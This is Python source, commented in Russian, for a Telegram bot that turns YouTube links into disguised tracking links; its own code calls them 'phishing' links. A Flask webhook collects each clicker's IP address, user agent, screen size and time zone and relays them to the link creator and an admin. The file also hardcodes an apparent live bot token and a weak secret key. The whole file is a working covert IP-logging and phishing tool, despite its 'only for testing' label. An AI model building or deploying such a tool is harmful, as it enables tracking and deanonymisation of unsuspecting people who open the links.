import logging
import json
import re
import uuid
from datetime import datetime
from typing import Dict, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # ЗАМЕНИТЕ НА РЕАЛЬНЫЙ!
ADMIN_ID = 1709490182
SECRET_KEY = "my-super-secret-key-12345"  # Должен совпадать с server.py
DOMAIN = "http://localhost:5000"  # Адрес вашего server.py

# ========== ХРАНИЛИЩЕ ДАННЫХ ==========
class Database:
    def __init__(self):
        self.links = {}  # {link_id: link_data}
        self.users = {}  # {user_id: user_data}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data": 0
        }
        self.load()
    
    def add_link(self, user_id: int, link_id: str, video_id: str, original_url: str):
        """Добавить новую ссылку"""
        self.links[link_id] = {
            "id": link_id,
            "user_id": user_id,
            "video_id": video_id,
            "original_url": original_url,
            "created": datetime.now().isoformat(),
            "clicks": 0,
            "data": []
        }
        
        # Обновляем статистику пользователя
        if user_id not in self.users:
            self.users[user_id] = {"links": 0, "clicks": 0}
        self.users[user_id]["links"] += 1
        
        self.stats["total_links"] += 1
        self.save()
    
    def add_click(self, link_id: str):
        """Добавить клик по ссылке"""
        if link_id in self.links:
            self.links[link_id]["clicks"] += 1
            
            # Обновляем статистику пользователя
            user_id = self.links[link_id]["user_id"]
            if user_id in self.users:
                self.users[user_id]["clicks"] += 1
            
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_data(self, link_id: str, data: dict):
        """Добавить собранные данные"""
        if link_id in self.links:
            self.links[link_id]["data"].append(data)
            self.stats["total_data"] += 1
            self.save()
    
    def get_user_links(self, user_id: int) -> List[dict]:
        """Получить ссылки пользователя"""
        return [link for link in self.links.values() if link["user_id"] == user_id]
    
    def get_link(self, link_id: str) -> Optional[dict]:
        """Получить ссылку по ID"""
        return self.links.get(link_id)
    
    def save(self):
        """Сохранить базу данных"""
        try:
            data = {
                "links": self.links,
                "users": self.users,
                "stats": self.stats,
                "saved_at": datetime.now().isoformat()
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Ошибка сохранения БД: {e}")
    
    def load(self):
        """Загрузить базу данных"""
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = data.get("links", {})
                self.users = data.get("users", {})
                self.stats = data.get("stats", self.stats)
            logger.info(f"БД загружена: {len(self.links)} ссылок")
        except FileNotFoundError:
            logger.info("Файл БД не найден, создаем новую")
        except Exception as e:
            logger.error(f"Ошибка загрузки БД: {e}")

# Инициализация БД
db = Database()

# ========== УТИЛИТЫ ==========
def extract_video_id(url: str) -> str:
    """Извлечь ID видео из YouTube ссылки"""
    patterns = [
        r'(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})',
        r'v=([a-zA-Z0-9_-]{11})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    
    return "dQw4w9WgXcQ"  # Rick Roll по умолчанию

def generate_link_id() -> str:
    """Сгенерировать ID ссылки"""
    return str(uuid.uuid4()).replace('-', '')[:8]

def create_phishing_url(video_id: str, link_id: str) -> str:
    """Создать фишинговую ссылку"""
    return f"{DOMAIN}/watch?v={video_id}&id={link_id}"

# ========== TELEGRAM КОМАНДЫ ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome = f"""
👋 Привет, {user.first_name}!

🤖 *YouTube Link Generator*

🎯 *Что делает бот:*
1. Принимает ссылку на YouTube
2. Создает специальную ссылку
3. При переходе собирает информацию
4. Отправляет данные вам

⚡ *Как использовать:*
Просто отправьте ссылку на YouTube видео

📊 *Статистика:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data']}`

⚠️ *Только для тестирования!*
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверка YouTube ссылки
    if not ('youtube.com' in url or 'youtu.be' in url):
        await update.message.reply_text(
            "❌ Это не ссылка YouTube.\n"
            "Отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Извлекаем ID видео
    video_id = extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = create_phishing_url(video_id, link_id)
    
    # Сохраняем в БД
    db.add_link(user.id, link_id, video_id, url)
    
    # Формируем сообщение
    message = f"""
✅ *Ссылка создана!*

🔗 *Оригинал:* {url[:50]}...

🚀 *Ваша ссылка:*
`{phishing_url}`

📌 *Информация:*
• ID: `{link_id}`
• Видео ID: `{video_id}`
• Время: {datetime.now().strftime('%H:%M:%S')}

📝 *Инструкция:*
1. Отправьте эту ссылку
2. При переходе соберутся данные
3. Данные придут сюда
"""
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка\n"
                 f"👤 @{user.username or user.id}\n"
                 f"🆔 {link_id}\n"
                 f"🎬 {video_id}"
        )
    except:
        pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "create":
        await query.message.reply_text(
            "🎯 Отправьте ссылку на YouTube видео\n\n"
            "Примеры:\n"
            "• https://youtube.com/watch?v=dQw4w9WgXcQ\n"
            "• https://youtu.be/dQw4w9WgXcQ"
        )
    
    elif data == "my_links":
        links = db.get_user_links(user_id)
        
        if not links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *Ваши ссылки:*\n\n"
        for link in links[-5:]:  # Последние 5 ссылок
            message += f"🔗 *ID:* `{link['id']}`\n"
            message += f"   👆 Переходов: {link['clicks']}\n"
            message += f"   📊 Данных: {len(link['data'])}\n"
            message += f"   🕐 {link['created'][:16].replace('T', ' ')}\n"
            message += "   ─────\n"
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "stats":
        message = f"""
📊 *Статистика:*

🔗 Всего ссылок: `{db.stats['total_links']}`
👆 Всего переходов: `{db.stats['total_clicks']}`
📈 Данных собрано: `{db.stats['total_data']}`

👤 *Ваша статистика:*
"""
        
        if user_id in db.users:
            user_stats = db.users[user_id]
            message += f"• Ваших ссылок: `{user_stats['links']}`\n"
            message += f"• Ваших переходов: `{user_stats['clicks']}`\n"
        else:
            message += "• У вас пока нет статистики\n"
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        
        if link and link["user_id"] == user_id:
            phishing_url = create_phishing_url(link["video_id"], link_id)
            await query.message.reply_text(
                f"📋 Ссылка для копирования:\n\n`{phishing_url}`",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена.")
    
    elif data.startswith("delete_"):
        link_id = data[7:]
        link = db.get_link(link_id)
        
        if link and link["user_id"] == user_id:
            # Помечаем как удаленную
            link["deleted"] = True
            db.save()
            await query.message.reply_text(f"✅ Ссылка `{link_id}` удалена.")
        else:
            await query.message.reply_text("❌ Ссылка не найдена.")

# ========== ВЕБХУК ОБРАБОТЧИК ==========
async def handle_webhook_data(data: dict):
    """Обработка данных от сервера"""
    try:
        link_id = data.get("link_id")
        if not link_id:
            logger.error("Нет link_id в данных")
            return
        
        # Добавляем клик
        db.add_click(link_id)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if not link:
            logger.error(f"Ссылка {link_id} не найдена")
            return
        
        # Сохраняем данные
        db.add_data(link_id, data)
        
        # Отправляем данные создателю
        user_id = link["user_id"]
        
        message = f"""
🔓 *Получены новые данные!*

🆔 ID ссылки: `{link_id}`
🕐 Время: {data.get('timestamp', '')[:19].replace('T', ' ')}
🌐 IP: `{data.get('ip', 'unknown')}`
💻 Устройство: {data.get('user_agent', '')[:30]}...
📱 Экран: {data.get('screen', 'unknown')}
🌍 Часовой пояс: {data.get('timezone', 'unknown')}

📊 Статистика ссылки:
• Переходов: {link['clicks']}
• Всего данных: {len(link['data'])}
"""
        
        # Отправляем через бота (нужен application)
        return message, user_id
        
    except Exception as e:
        logger.error(f"Ошибка обработки вебхука: {e}")
        return None, None

# ========== FLASK ДЛЯ ВЕБХУКОВ (упрощенный) ==========
from flask import Flask, request, jsonify

webhook_app = Flask(__name__)
application = None  # Будет установлено позже

@webhook_app.route('/webhook', methods=['POST'])
def webhook():
    """Эндпоинт для получения данных от server.py"""
    try:
        # Проверка ключа
        auth_key = request.headers.get('X-Auth-Key', '')
        if auth_key != SECRET_KEY:
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        logger.info(f"Вебхук получен: {data.get('link_id', 'unknown')}")
        
        # Обрабатываем синхронно (упрощенно)
        link_id = data.get("link_id")
        if link_id:
            # Добавляем в БД
            db.add_click(link_id)
            db.add_data(link_id, data)
            
            # Получаем информацию для отправки
            link = db.get_link(link_id)
            if link:
                # Отправляем уведомление (если бот запущен)
                pass
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@webhook_app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'service': 'Bot Webhook'})

def run_webhook_server():
    """Запуск вебхук сервера"""
    logger.info("Запуск вебхук сервера на порту 8080")
    webhook_app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)

# ========== ОСНОВНАЯ ФУНКЦИЯ ==========
async def main_async():
    """Асинхронный запуск бота"""
    # Создаем приложение
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stats", lambda u, c: button_handler(u, c)))
    
    # Обработчик YouTube ссылок
    app.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик кнопок
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Запускаем бота
    print(f"""
    {'='*50}
    🤖 YouTube Bot запущен!
    👤 Админ: {ADMIN_ID}
    💾 БД: {len(db.links)} ссылок
    ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    {'='*50}
    Ожидание команд...
    """)
    
    await app.run_polling()

def main():
    """Главная функция"""
    import threading
    import asyncio
    
    # Запускаем вебхук сервер в отдельном потоке
    webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
    webhook_thread.start()
    
    # Запускаем бота
    asyncio.run(main_async())

if __name__ == '__main__':
    main()
